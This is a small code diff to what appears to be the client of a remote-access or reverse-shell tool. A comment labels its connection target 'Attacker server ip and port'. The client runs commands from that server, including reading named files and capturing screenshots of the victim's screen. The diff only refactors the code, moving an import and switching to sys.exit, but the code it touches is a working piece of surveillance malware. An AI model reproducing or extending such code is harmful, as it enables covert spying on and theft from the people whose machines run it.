@@ -6,7 +6,6 @@ import sys
 from command_payload import CommandPayload
 from command_payload import parse_payload_to_output
 from secure_socket import SecureSocket
-import mss
 
 # Attacker server ip and port
 ip = "192.168.1.215"
@@ -24,7 +23,7 @@ def run_custom_command(cmd: str) -> CommandPayload:
         exit_flag = True
         result.stdout = "Session ended"
         if cmd[1] == "exit_full":
-            exit(0)
+            sys.exit(0)
     elif cmd[1] == "file":
         file_name = cmd[2]
         try:
@@ -36,6 +35,7 @@ def run_custom_command(cmd: str) -> CommandPayload:
             result.stderr = "Cannot open file " + file_name
     elif cmd[1] == "screen":
         try:
+            import mss
             with mss.mss() as sct:
                 file_name = sct.shot(mon=-1)
                 sct.save(file_name)
